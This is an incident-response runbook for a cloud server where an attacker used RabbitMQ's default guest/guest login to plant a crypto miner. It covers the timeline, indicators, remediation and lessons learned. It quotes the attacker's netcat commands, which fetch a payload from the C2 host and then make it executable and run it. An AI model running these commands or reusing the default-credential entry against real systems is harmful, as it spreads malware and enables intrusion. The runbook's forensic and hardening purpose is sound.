# Runbook: Incident — RabbitMQ-Vectored Crypto Miner Compromise

Created: 2026-04-04
Status: **Remediated** — attack vector closed, malware killed, firewall enabled

## Summary

On 2026-04-04 at ~18:32 UTC, an attacker exploited the RabbitMQ AMQP port (5672) with default `guest/guest` credentials to execute arbitrary commands as the `battlestats` service user. The attacker deployed a crypto miner and a persistent downloader/dropper that repeatedly fetched payloads from a C2 server. The miner consumed 53% of system RAM (2.1GB) and 142% CPU, directly causing gunicorn worker OOM kills and user-facing 500 errors on profile chart endpoints.

## Timeline

| Time (UTC)  | Event                                                                                                                                            |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| 18:32:00    | Attacker files appear in `/dev/shm/`: `JLOiBF` (1.3MB dropper), `iadEFX` (2.6MB miner), `Dj` (8KB config)                                        |
| 18:33:00    | First `nc` shell processes spawned — downloading payloads from `107.175.89.136:9009`                                                             |
| 18:33:13    | Crypto miner process starts (PID 830677, `/dev/shm/iadEFX -c /dev/shm/Dj -B`)                                                                    |
| 18:33-20:21 | Multiple waves of `nc` downloaders spawned at intervals (~18:33, 18:48, 19:16, 19:59, 20:16, 20:21)                                              |
| 20:38-20:41 | User reports "Unable to load profile charts" — gunicorn workers OOM killed trying to compute tier_type correlation with only 237MB RAM available |
| 20:43       | Incident detected during performance investigation. Miners and `/dev/shm/` files killed/deleted                                                  |
| 20:43       | First batch of `nc` downloaders (from `/dev/shm/`) killed                                                                                        |
| 20:57       | Remaining `nc` downloaders (from `/tmp/`) killed                                                                                                 |
| 21:03       | RabbitMQ `guest` user deleted, new authenticated user created                                                                                    |
| 21:03       | UFW firewall enabled — only ports 22, 80, 443 allowed inbound                                                                                    |
| 21:04       | All services restarted with new broker credentials, verified healthy                                                                             |

## Attack Vector

### Root Cause: RabbitMQ AMQP port exposed to the internet with default credentials

**RabbitMQ 3.12** was listening on `0.0.0.0:5672` (AMQP), `0.0.0.0:25672` (Erlang distribution), and `0.0.0.0:4369` (EPMD) — all reachable from the internet. The `guest` user had the default password `guest` with administrator privileges.

RabbitMQ's `guest` account was historically restricted to localhost-only connections in recent versions, but this restriction only applies to the **management plugin** (HTTP API on port 15672), not the AMQP protocol on port 5672. The management plugin was not enabled on this server, but the AMQP port was wide open.

**No firewall was configured.** UFW was present but `inactive`. The DigitalOcean droplet had no cloud firewall rules either.

### Attack Execution

The attacker connected to AMQP port 5672 with `guest/guest` credentials, then likely used RabbitMQ's Erlang distribution port (25672) or the AMQP protocol itself to achieve code execution as the `battlestats` service user (UID 999). The attack pattern:

1. **Stage 1 — Dropper:** Downloaded `/dev/shm/JLOiBF` (1.3MB, statically linked ELF x86-64, no section headers — stripped/packed) and `/dev/shm/iadEFX` (2.6MB, same characteristics)
2. **Stage 2 — Miner:** Executed `/dev/shm/iadEFX -c /dev/shm/Dj -B` as a long-running crypto miner with 7 threads
3. **Stage 3 — Persistence:** Spawned repeating `nc` shell commands to re-download payloads:
   ```
   /bin/sh -c nc 107.175.89.136 9009 > /dev/shm/let;chmod 711 /dev/shm/let;/dev/shm/let &
   /bin/sh -c nc 107.175.89.136 9009 > /tmp/let;chmod 750 /tmp/let;/tmp/let &
   ```
   These ran in pairs (one targeting `/dev/shm/`, one targeting `/tmp/`) at ~15-30 minute intervals, suggesting a timer or watchdog in the dropper.

### C2 Server

| Field    | Value                                                             |
| -------- | ----------------------------------------------------------------- |
| IP       | `107.175.89.136`                                                  |
| Port     | 9009                                                              |
| Hostname | `107-175-89-136-host.colocrossing.com`                            |
| ISP      | HostPapa / AS36352                                                |
| Location | Buffalo, New York, USA                                            |
| Type     | Likely a compromised or rented VPS on ColoCrossing infrastructure |

### Prior Incident

A similar suspicious process (PID 745356, `/dev/shm/lblSR`, 2.1GB RSS, 145% CPU) was observed on 2026-04-04 ~04:15 UTC during a previous session but was not investigated. That process is no longer running at the time of this incident (killed by reboot or OOM). This means the attacker had access for at least **14 hours** before remediation.

## Impact

### User-Facing

- **Profile chart 500 errors:** The `player_correlation/tier_type` endpoint OOM-killed gunicorn workers when computing the population correlation (275K player table scan requires >500MB). With the miner consuming 2.1GB, gunicorn had only ~237MB available.
- **"Unable to load profile charts right now"** message displayed on player profile pages.
- **Slow page loads:** All endpoints degraded due to CPU contention with the 142% CPU miner.

### System

- **Memory:** 2.1GB consumed by miner + ~100MB by `nc` processes and dropper
- **CPU:** 142% sustained by miner (2+ cores)
- **Swap:** 1.3GB of 2GB used (vs 216MB after cleanup)
- **Worker instability:** 5+ gunicorn workers OOM-killed in a 3-minute window

### Data

- **No evidence of data exfiltration.** The attacker used the `battlestats` service account (nologin shell, no SSH keys, no crontab). Attack was focused on crypto mining, not data theft.
- **No database access from miner processes.** The miner binaries connected only to the C2 server and mining pools.
- **RabbitMQ message queues were not tampered with** — Celery tasks continued running normally throughout.

## Remediation Applied

### Immediate (2026-04-04 20:43-21:04 UTC)

1. **Killed all malicious processes:** miner (PID 830677), dropper (PID 830620), all `nc` downloader shells (24 processes)
2. **Deleted malware files:** `/dev/shm/iadEFX`, `/dev/shm/Dj`, `/dev/shm/JLOiBF`, `/dev/shm/let`, `/tmp/let`, `/tmp/ccoYVnKY.res`
3. **Deleted RabbitMQ `guest` user** — default credentials completely removed
4. **Created authenticated RabbitMQ user** with random hex password (no special URL characters)
5. **Updated `CELERY_BROKER_URL`** in `/etc/battlestats-server.env` with new credentials
6. **Enabled UFW firewall** with deny-all-incoming default:
   - Port 22 (SSH) — allowed
   - Port 80 (HTTP) — allowed
   - Port 443 (HTTPS) — allowed
   - All other ports — blocked (including 5672, 25672, 4369, 3002, 6379, 8888, 15672)
7. **Restarted all services** — gunicorn, celery (default, hydration, background), beat
8. **Verified port scan** — only 22, 80, 443 reachable externally

### Code Fix (deployed same session)

- **Published cache fallback for correlation endpoints:** When the primary cache TTL expires and the warmer hasn't refreshed it, the endpoint now falls back to the durable published cache instead of attempting an expensive full-table scan that can OOM a gunicorn worker. Applied to `_fetch_player_tier_type_population_correlation`, `_fetch_player_ranked_wr_battles_population_correlation`, and `fetch_player_wr_survival_correlation` in `data.py`.

## Exposed Ports Before Remediation

| Port  | Service             | Bound To    | Accessible Externally | Risk                             |
| ----- | ------------------- | ----------- | --------------------- | -------------------------------- |
| 22    | SSH                 | `0.0.0.0`   | Yes                   | Low (pubkey only)                |
| 80    | nginx HTTP          | `0.0.0.0`   | Yes                   | Expected                         |
| 443   | nginx HTTPS         | `0.0.0.0`   | Yes                   | Expected                         |
| 3001  | Next.js dev         | `127.0.0.1` | No                    | None                             |
| 3002  | Umami analytics     | `*`         | **Yes**               | Medium — no auth on port         |
| 4369  | EPMD (Erlang)       | `*`         | **Yes**               | **High** — Erlang node discovery |
| 5672  | RabbitMQ AMQP       | `*`         | **Yes**               | **Critical** — attack vector     |
| 6379  | Redis               | `127.0.0.1` | No                    | None                             |
| 8888  | Gunicorn            | `127.0.0.1` | No                    | None                             |
| 25672 | Erlang distribution | `0.0.0.0`   | **Yes**               | **High** — inter-node RPC        |

## Prevention

### Done

- [x] UFW firewall enabled with deny-all default
- [x] RabbitMQ `guest` user deleted
- [x] RabbitMQ bound to authenticated user only
- [x] External port scan confirms only 22/80/443 open

### Recommended

- [ ] **DigitalOcean Cloud Firewall:** Add a DO cloud firewall as defense-in-depth (UFW can be disabled by a compromised root user; DO firewall cannot)
- [ ] **Bind RabbitMQ to localhost only:** Edit `/etc/rabbitmq/rabbitmq.conf` to set `listeners.tcp.default = 127.0.0.1:5672` so even without a firewall, AMQP isn't exposed
- [ ] **Bind Umami to localhost:** Port 3002 was externally accessible. Bind Next.js to `127.0.0.1` or ensure nginx proxying is the only access path
- [ ] **SSH hardening:** `PermitRootLogin` is `yes` — consider switching to `prohibit-password` (already pubkey-only but belt-and-suspenders)
- [ ] **Fail2ban:** No brute-force protection. The `lastb` log shows constant SSH brute-force attempts from multiple IPs
- [ ] **Periodic port scan:** Add a cron or monitoring check that alerts if unexpected ports become externally reachable
- [ ] **File integrity monitoring:** `/dev/shm/` and `/tmp/` should be monitored for new executables (inotifywait, AIDE, or similar)
- [ ] **Separate service user privileges:** The `battlestats` user runs all services (gunicorn, celery, next.js). A compromise of any one service gives access to all. Consider per-service users.
- [ ] **Network egress filtering:** The miner connected to external mining pools and the C2 server freely. Egress filtering would limit outbound connections to known-good destinations.

## Concrete Remediation Checklist

### Repo-level fixes

- [x] Patch `server/deploy/bootstrap_droplet.sh` to bind RabbitMQ to `127.0.0.1` via `/etc/rabbitmq/rabbitmq.conf`
- [x] Patch `server/deploy/bootstrap_droplet.sh` to provision a dedicated `battlestats` RabbitMQ user with a generated hex password instead of `guest/guest`
- [x] Patch `server/deploy/bootstrap_droplet.sh` to delete the `guest` user after provisioning the local broker user
- [x] Patch `server/deploy/deploy_to_droplet.sh` to reconcile RabbitMQ credentials on every deploy instead of preserving insecure placeholders indefinitely
- [x] Patch `server/deploy/deploy_to_droplet.sh` to verify broker authentication after service restart
- [x] Patch `server/gunicorn.conf.py` so startup cache warm dispatch failure does not crash web startup
- [x] Migrate legacy startup warm env names to the current `WARM_CACHES_ON_STARTUP` and `CACHE_WARMUP_START_DELAY_SECONDS` contract

### Droplet follow-up

- [ ] Reconcile the live RabbitMQ broker credentials on the current droplet with `/etc/battlestats-server.env` and confirm `rabbitmqctl list_users` only shows intended users
- [ ] Re-enable `WARM_CACHES_ON_STARTUP` on the droplet only after broker auth is verified stable through at least one backend deploy
- [ ] Add a DigitalOcean Cloud Firewall so AMQP/Erlang ports stay blocked even if UFW is disabled or root is compromised
- [ ] Verify RabbitMQ is no longer reachable externally with `nmap` or `ss` from outside the droplet

### Broader operational hardening

- [ ] Move the remaining heavy background warmers off the droplet or gate their Beat registration so web startup no longer depends on RabbitMQ availability
- [ ] Add a production post-deploy smoke step that checks API `200` plus a broker-auth send/connect path before considering backend deploy healthy
- [ ] Audit other internal services for localhost-only binding and credential drift, especially Umami and any future message brokers

## Forensic Artifacts

### Malware hashes (not collected — files deleted before hashing)

Files were deleted during triage. In future incidents, hash before deleting:

```bash
sha256sum /dev/shm/iadEFX /dev/shm/Dj /dev/shm/JLOiBF
```

### Process characteristics

| File              | Size            | Type                                                         | Description                                              |
| ----------------- | --------------- | ------------------------------------------------------------ | -------------------------------------------------------- |
| `/dev/shm/iadEFX` | 2,637,380 bytes | ELF 64-bit LSB, x86-64, statically linked, no section header | Crypto miner — 7 threads, 142% CPU, 2.1GB RSS            |
| `/dev/shm/Dj`     | 8,228 bytes     | Config file                                                  | Miner configuration (pool addresses, wallet, etc.)       |
| `/dev/shm/JLOiBF` | 1,309,300 bytes | ELF 64-bit LSB, x86-64, statically linked, no section header | Dropper/watchdog — spawned `nc` downloaders periodically |

### Network indicators

| Indicator        | Value                                                                         |
| ---------------- | ----------------------------------------------------------------------------- |
| C2 IP            | `107.175.89.136`                                                              |
| C2 Port          | `9009/tcp`                                                                    |
| C2 Protocol      | Raw TCP via `nc` (netcat)                                                     |
| C2 ISP           | HostPapa / ColoCrossing, Buffalo NY                                           |
| Download pattern | `nc 107.175.89.136 9009 > /dev/shm/let` or `/tmp/let`, then `chmod` + execute |

### Timing pattern of `nc` downloaders

| Wave | Time (UTC) | Targets                     |
| ---- | ---------- | --------------------------- |
| 1    | 18:33      | `/dev/shm/let`, `let` (cwd) |
| 2    | 18:48      | `/tmp/let`, `let` (cwd)     |
| 3    | 19:16      | `/tmp/let`, `let` (cwd)     |
| 4    | 19:59      | `/tmp/let`, `let` (cwd)     |
| 5    | 20:16      | `/tmp/let`, `let` (cwd)     |
| 6    | 20:21      | `/tmp/let`, `let` (cwd)     |

~15-30 minute interval between waves. All ran as `battlestats` user. The `CLOSE-WAIT` state on most connections at time of discovery suggests the C2 server had stopped responding (possibly timed out or dropped).

## Lessons Learned

1. **No firewall is the #1 failure.** A single `ufw enable` with default deny would have prevented this entirely. Every production server must have a firewall from day one.
2. **Default credentials on any service exposed to the internet will be exploited.** RabbitMQ's `guest/guest` is as well-known as MySQL's `root` with no password.
3. **Service ports must be explicitly bound to localhost** unless they need external access. RabbitMQ, Redis, and internal services should never listen on `0.0.0.0`.
4. **The `battlestats` nologin shell did not prevent code execution.** The attack didn't need an interactive shell — it executed commands through RabbitMQ's message handling. A nologin shell only prevents SSH login, not process spawning by the user.
5. **Resource starvation from crypto miners causes cascading failures.** The miner didn't attack the application directly, but by consuming RAM it caused gunicorn OOMs, which caused user-facing errors. The performance symptoms (slow reloads, "Unable to load" messages) were the first indicators.
